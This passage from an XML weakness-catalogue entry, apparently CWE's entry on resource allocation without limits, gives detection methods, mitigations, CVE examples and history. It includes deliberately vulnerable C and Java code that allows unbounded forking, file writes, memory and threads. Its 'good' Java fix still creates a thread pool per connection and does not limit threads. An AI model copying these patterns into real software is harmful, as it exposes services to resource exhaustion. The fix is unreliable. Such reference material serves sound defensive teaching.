               <ns0:Note>When allocating resources without limits, an attacker could prevent other systems, applications, or processes from accessing the same type of resource.</ns0:Note>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Detection_Methods>
            <ns0:Detection_Method Detection_Method_ID="DM-8">
               <ns0:Method>Manual Static Analysis</ns0:Method>
               <ns0:Description>Manual static analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. If denial-of-service is not considered a significant risk, or if there is strong emphasis on consequences such as code execution, then manual analysis may not focus on this weakness at all.</ns0:Description>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Fuzzing</ns0:Method>
               <ns0:Description>
                  <html:p>While fuzzing is typically geared toward finding low-level implementation bugs, it can inadvertently find uncontrolled resource allocation problems. This can occur when the fuzzer generates a large number of test cases but does not restart the targeted product in between test cases. If an individual test case produces a crash, but it does not do so reliably, then an inability to limit resource allocation may be the cause.</html:p>
                  <html:p>When the allocation is directly affected by numeric inputs, then fuzzing may produce indications of this weakness.</html:p>
               </ns0:Description>
               <ns0:Effectiveness>Opportunistic</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Automated Dynamic Analysis</ns0:Method>
               <ns0:Description>Certain automated dynamic analysis techniques may be effective in producing side effects of uncontrolled resource allocation problems, especially with resources such as processes, memory, and connections. The technique may involve generating a large number of requests to the product within a short time frame. Manual analysis is likely required to interpret the results.</ns0:Description>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Automated Static Analysis</ns0:Method>
               <ns0:Description>
                  <html:p>Specialized configuration or tuning may be required to train automated tools to recognize this weakness.</html:p>
                  <html:p>Automated static analysis typically has limited utility in recognizing unlimited allocation problems, except for the missing release of program-independent system resources such as files, sockets, and processes, or unchecked arguments to memory. For system resources, automated static analysis may be able to detect circumstances in which resources are not released after they have expired, or if too much of a resource is requested at once, as can occur with memory. Automated analysis of configuration files may be able to detect settings that do not specify a maximum value.</html:p>
                  <html:p>Automated static analysis tools will not be appropriate for detecting exhaustion of custom resources, such as an intended security policy in which a bulletin board user is only allowed to make a limited number of posts per day.</html:p>
               </ns0:Description>
            </ns0:Detection_Method>
         </ns0:Detection_Methods>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation>
               <ns0:Phase>Requirements</ns0:Phase>
               <ns0:Description>Clearly specify the minimum and maximum expectations for capabilities, and dictate which behaviors are acceptable when resource allocation reaches limits.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Description>Limit the amount of resources that are accessible to unprivileged users. Set per-user limits for resources. Allow the system administrator to define these limits. Be careful to avoid CWE-410.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Description>Design throttling mechanisms into the system architecture. The best protection is to limit the amount of resources that an unauthorized user can cause to be expended. A strong authentication and access control model will help prevent such attacks from occurring in the first place, and it will help the administrator to identify who is committing the abuse. The login application should be protected against DoS attacks as much as possible. Limiting the database access, perhaps by caching result sets, can help minimize the resources expended. To further limit the potential for a DoS attack, consider tracking the rate of requests received from users and blocking requests that exceed a defined rate threshold.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-5">
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Strategy>Input Validation</ns0:Strategy>
               <ns0:Description>
                  <html:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</html:p>
                  <html:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</html:p>
                  <html:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</html:p>
               </ns0:Description>
               <ns0:Effectiveness_Notes>This will only be applicable to cases where user input can influence the size or frequency of resource allocations.</ns0:Effectiveness_Notes>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-15">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Description>
                  <html:p>Mitigation of resource exhaustion attacks requires that the target system either:</html:p>
                     <html:ul>
                        <html:li>recognizes the attack and denies that user further access for a given amount of time, typically by using increasing time delays</html:li>
                        <html:li>uniformly throttles all requests in order to make it more difficult to consume resources more quickly than they can again be freed.</html:li>
                     </html:ul>
                  <html:p>The first of these solutions is an issue in itself though, since it may allow attackers to prevent the use of the system by a particular valid user. If the attacker impersonates the valid user, they may be able to prevent the user from accessing the server in question.</html:p>
                  <html:p>The second solution can be difficult to effectively institute -- and even when properly done, it does not provide a full solution. It simply requires more resources on the part of the attacker.</html:p>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Description>Ensure that protocols have specific limits of scale placed on them.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-38.1">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>
                  <html:p>If the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery.</html:p>
                  <html:p>Ensure that all failures in resource allocation place the system into a safe posture.</html:p>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-47">
               <ns0:Phase>Operation</ns0:Phase>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Strategy>Resource Limitation</ns0:Strategy>
               <ns0:Description>
                  <html:p>Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.</html:p>
                  <html:p>When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.</html:p>
                  <html:p>Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).</html:p>
               </ns0:Description>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Demonstrative_Examples>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-25">
               <ns0:Intro_Text>This code allocates a socket and forks each time it receives a new connection.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>sock=socket(AF_INET, SOCK_STREAM, 0);<html:br />while (1) {<html:div style="margin-left:1em;">newsock=accept(sock, ...);<html:br />printf("A connection has been accepted\n");<html:br />pid = fork();</html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>The program does not track how many connections have been made, and it does not limit the number of connections. Because forking is a relatively expensive operation, an attacker would be able to cause the system to run out of CPU, processes, or memory by making a large number of connections. Alternatively, an attacker could consume all available connections, preventing others from accessing the system remotely.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-50">
               <ns0:Intro_Text>In the following example a server socket connection is used to accept a request to store data on the local file system using a specified filename. The method openSocketConnection establishes a server socket to accept requests from a client. When a client establishes a connection to this service the getNextMessage method is first used to retrieve from the socket the name of the file to store the data, the openFileToWrite method will validate the filename and open a file to write to on the local file system. The getNextMessage is then used within a while loop to continuously read data from the socket and output the data to the file until there is no longer any data from the socket.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>int writeDataFromSocketToFile(char *host, int port)<html:br />{<html:div style="margin-left:1em;">
                        <html:div>
                           <html:br />char filename[FILENAME_SIZE];<html:br />char buffer[BUFFER_SIZE];<html:br />int socket = openSocketConnection(host, port);<html:br />
                           <html:br />if (socket &lt; 0) {<html:div style="margin-left:1em;">printf("Unable to open socket connection");<html:br />return(FAIL);</html:div>}<html:br />if (getNextMessage(socket, filename, FILENAME_SIZE) &gt; 0) {<html:div style="margin-left:1em;">
                              <html:div>if (openFileToWrite(filename) &gt; 0) {<html:div style="margin-left:1em;">
                                    <html:div>while (getNextMessage(socket, buffer, BUFFER_SIZE) &gt; 0){<html:div style="margin-left:1em;">if (!(writeToFile(buffer) &gt; 0))<html:div style="margin-left:1em;">break;</html:div>
                                       </html:div>}</html:div>
                                 </html:div>}<html:br />closeFile();</html:div>
                           </html:div>}<html:br />closeSocket(socket);</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>This example creates a situation where data can be dumped to a file on the local file system without any limits on the size of the file. This could potentially exhaust file or disk resources and/or limit other clients' ability to access the service.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-51">
               <ns0:Intro_Text>In the following example, the processMessage method receives a two dimensional character array containing the message to be processed. The two-dimensional character array contains the length of the message in the first character array and the message body in the second character array. The getMessageLength method retrieves the integer value of the length from the first character array. After validating that the message length is greater than zero, the body character array pointer points to the start of the second character array of the two-dimensional character array and memory is allocated for the new body character array.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>
                     <html:br />
                     <html:i>/* process message accepts a two-dimensional character array of the form [length][body] containing the message to be processed */</html:i>
                     <html:br />int processMessage(char **message)<html:br />{<html:div style="margin-left:1em;">
                        <html:div>char *body;<html:br />
                           <html:br />int length = getMessageLength(message[0]);<html:br />
                           <html:br />if (length &gt; 0) {<html:div style="margin-left:1em;">body = &amp;message[1][0];<html:br />processMessageBody(body);<html:br />return(SUCCESS);</html:div>}<html:br />else {<html:div style="margin-left:1em;">printf("Unable to process message; invalid message length");<html:br />return(FAIL);</html:div>}</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>This example creates a situation where the length of the body character array can be very large and will consume excessive memory, exhausting system resources. This can be avoided by restricting the length of the second character array with a maximum length check</ns0:Body_Text>
               <ns0:Body_Text>Also, consider changing the type from 'int' to 'unsigned int', so that you are always guaranteed that the number is positive. This might not be possible if the protocol specifically requires allowing negative values, or if you cannot control the return value from getMessageLength(), but it could simplify the check to ensure the input is positive, and eliminate other errors such as signed-to-unsigned conversion errors (CWE-195) that may occur elsewhere in the code.</ns0:Body_Text>
               <ns0:Example_Code Nature="Good" Language="C">
                  <html:div>unsigned int length = getMessageLength(message[0]);<html:br />if ((length &gt; 0) &amp;&amp; (length &lt; MAX_LENGTH)) {...}</html:div>
               </ns0:Example_Code>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-52">
               <ns0:Intro_Text>In the following example, a server object creates a server socket and accepts client connections to the socket. For every client connection to the socket a separate thread object is generated using the ClientSocketThread class that handles request made by the client through the socket.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Java">
                  <html:div>public void acceptConnections() {<html:br />
                     <html:div style="margin-left:1em;">
                        <html:div>try {<html:div style="margin-left:1em;">ServerSocket serverSocket = new ServerSocket(SERVER_PORT);<html:br />int counter = 0;<html:br />boolean hasConnections = true;<html:br />while (hasConnections) {<html:div style="margin-left:1em;">Socket client = serverSocket.accept();<html:br />Thread t = new Thread(new ClientSocketThread(client));<html:br />t.setName(client.getInetAddress().getHostName() + ":" + counter++);<html:br />t.start();</html:div>}<html:br />serverSocket.close();</html:div>
                           <html:br />
                           <html:br />} catch (IOException ex) {...}</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>In this example there is no limit to the number of client connections and client threads that are created. Allowing an unlimited number of client connections and threads could potentially overwhelm the system and system resources.</ns0:Body_Text>
               <ns0:Body_Text>The server should limit the number of client connections and the client threads that are created. This can be easily done by creating a thread pool object that limits the number of threads that are generated.</ns0:Body_Text>
               <ns0:Example_Code Nature="Good" Language="Java">
                  <html:div>public static final int SERVER_PORT = 4444;<html:br />public static final int MAX_CONNECTIONS = 10;<html:br />...<html:br />
                     <html:br />public void acceptConnections() {<html:br />
                     <html:div style="margin-left:1em;">
                        <html:div>try {<html:div style="margin-left:1em;">ServerSocket serverSocket = new ServerSocket(SERVER_PORT);<html:br />int counter = 0;<html:br />boolean hasConnections = true;<html:br />while (hasConnections) {<html:div style="margin-left:1em;">hasConnections = checkForMoreConnections();<html:br />Socket client = serverSocket.accept();<html:br />Thread t = new Thread(new ClientSocketThread(client));<html:br />t.setName(client.getInetAddress().getHostName() + ":" + counter++);<html:br />ExecutorService pool = Executors.newFixedThreadPool(MAX_CONNECTIONS);<html:br />pool.execute(t);</html:div>}<html:br />serverSocket.close();</html:div>
                           <html:br />
                           <html:br />} catch (IOException ex) {...}</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>An unnamed web site allowed a user to purchase tickets for an event. A menu option allowed the user to purchase up to 10 tickets, but the back end did not restrict the actual number of tickets that could be purchased.</ns0:Intro_Text>
               <ns0:References>
                  <ns0:Reference External_Reference_ID="REF-667" />
               </ns0:References>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>Here the problem is that every time a connection is made, more memory is allocated. So if one just opened up more and more connections, eventually the machine would run out of memory.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>bar connection() {<html:div style="margin-left:1em;">foo = malloc(1024);<html:br />return foo;</html:div>}<html:br /><html:br />endConnection(bar foo) {<html:div style="margin-left:1em;">free(foo);</html:div>}<html:br /><html:br />int main() {<html:div style="margin-left:1em;">while(1) {<html:div style="margin-left:1em;">foo=connection();</html:div>}<html:br /><html:br />endConnection(foo)</html:div>}</html:div>
               </ns0:Example_Code>
            </ns0:Demonstrative_Example>
         </ns0:Demonstrative_Examples>
         <ns0:Observed_Examples>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2022-21668</ns0:Reference>
               <ns0:Description>Chain: Python library does not limit the resources used to process images that specify a very large number of bands (CWE-1284), leading to excessive memory consumption (CWE-789) or an integer overflow (CWE-190).</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2022-21668</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-4017</ns0:Reference>
               <ns0:Description>Language interpreter does not restrict the number of temporary files being created when handling a MIME request with a large number of parts..</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-4017</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2726</ns0:Reference>
               <ns0:Description>Driver does not use a maximum width when invoking sscanf style functions, causing stack consumption.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2726</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2540</ns0:Reference>
               <ns0:Description>Large integer value for a length property in an object causes a large amount of memory allocation.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2540</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2054</ns0:Reference>
               <ns0:Description>Product allows exhaustion of file descriptors when processing a large number of TCP packets.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2054</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-5180</ns0:Reference>
               <ns0:Description>Communication product allows memory consumption with a large number of SIP requests, which cause many sessions to be created.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-5180</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-1700</ns0:Reference>
               <ns0:Description>Product allows attackers to cause a denial of service via a large number of directives, each of which opens a separate window.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-1700</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-4650</ns0:Reference>
               <ns0:Description>CMS does not restrict the number of searches that can occur simultaneously, leading to resource exhaustion.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-4650</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-15100</ns0:Reference>
               <ns0:Description>web application scanner attempts to read an excessively large file created by a user, causing process termination</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-15100</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-7218</ns0:Reference>
               <ns0:Description>Go-based workload orchestrator does not limit resource usage with unauthenticated connections, allowing a DoS by flooding the service</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-7218</ns0:Link>
            </ns0:Observed_Example>
         </ns0:Observed_Examples>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <ns0:Entry_ID>FIO04-J</ns0:Entry_ID>
               <ns0:Entry_Name>Close resources when they are no longer needed</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <ns0:Entry_ID>SER12-J</ns0:Entry_ID>
               <ns0:Entry_Name>Avoid memory and resource leaks during serialization</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <ns0:Entry_ID>MSC05-J</ns0:Entry_ID>
               <ns0:Entry_Name>Do not exhaust heap space</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern CAPEC_ID="125" />
            <ns0:Related_Attack_Pattern CAPEC_ID="130" />
            <ns0:Related_Attack_Pattern CAPEC_ID="147" />
            <ns0:Related_Attack_Pattern CAPEC_ID="197" />
            <ns0:Related_Attack_Pattern CAPEC_ID="229" />
            <ns0:Related_Attack_Pattern CAPEC_ID="230" />
            <ns0:Related_Attack_Pattern CAPEC_ID="231" />
            <ns0:Related_Attack_Pattern CAPEC_ID="469" />
            <ns0:Related_Attack_Pattern CAPEC_ID="482" />
            <ns0:Related_Attack_Pattern CAPEC_ID="486" />
            <ns0:Related_Attack_Pattern CAPEC_ID="487" />
            <ns0:Related_Attack_Pattern CAPEC_ID="488" />
            <ns0:Related_Attack_Pattern CAPEC_ID="489" />
            <ns0:Related_Attack_Pattern CAPEC_ID="490" />
            <ns0:Related_Attack_Pattern CAPEC_ID="491" />
            <ns0:Related_Attack_Pattern CAPEC_ID="493" />
            <ns0:Related_Attack_Pattern CAPEC_ID="494" />
            <ns0:Related_Attack_Pattern CAPEC_ID="495" />
            <ns0:Related_Attack_Pattern CAPEC_ID="496" />
            <ns0:Related_Attack_Pattern CAPEC_ID="528" />
         </ns0:Related_Attack_Patterns>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-386" />
            <ns0:Reference External_Reference_ID="REF-387" />
            <ns0:Reference External_Reference_ID="REF-388" />
            <ns0:Reference External_Reference_ID="REF-7" Section="Chapter 17, &quot;Protecting Against Denial of Service Attacks&quot; Page 517" />
            <ns0:Reference External_Reference_ID="REF-667" />
            <ns0:Reference External_Reference_ID="REF-672" />
            <ns0:Reference External_Reference_ID="REF-62" Section="Chapter 10, &quot;Resource Limits&quot;, Page 574" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Allowed</ns0:Usage>
            <ns0:Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</ns0:Rationale>
            <ns0:Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Acceptable-Use" />
            </ns0:Reasons>
         </ns0:Mapping_Notes>
         <ns0:Notes>
            <ns0:Note Type="Relationship">This entry is different from uncontrolled resource consumption (CWE-400) in that there are other weaknesses that are related to inability to control resource consumption, such as holding on to a resource too long after use, or not correctly keeping track of active resources so that they can be managed and released when they are finished (CWE-771).</ns0:Note>
            <ns0:Note Type="Theoretical">Vulnerability theory is largely about how behaviors and resources interact. "Resource exhaustion" can be regarded as either a consequence or an attack, depending on the perspective. This entry is an attempt to reflect one of the underlying weaknesses that enable these attacks (or consequences) to take place.</ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CWE Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>MITRE</ns0:Submission_Organization>
               <ns0:Submission_Date>2009-05-13</ns0:Submission_Date>
               <ns0:Submission_Version>1.4</ns0:Submission_Version>
               <ns0:Submission_ReleaseDate>2009-05-27</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-07-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-10-29</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-12-28</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Detection_Factors, Observed_Examples, References, Time_of_Introduction</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-02-16</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Detection_Factors, Potential_Mitigations, References, Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-04-05</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-06-21</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Potential_Mitigations, References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-09-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-03-29</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Detection_Factors, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-09-13</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-05-11</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-10-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-02-18</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-06-23</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-03</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-11-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-03-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated References</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-01-03</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Demonstrative_Examples, Description, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-06-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
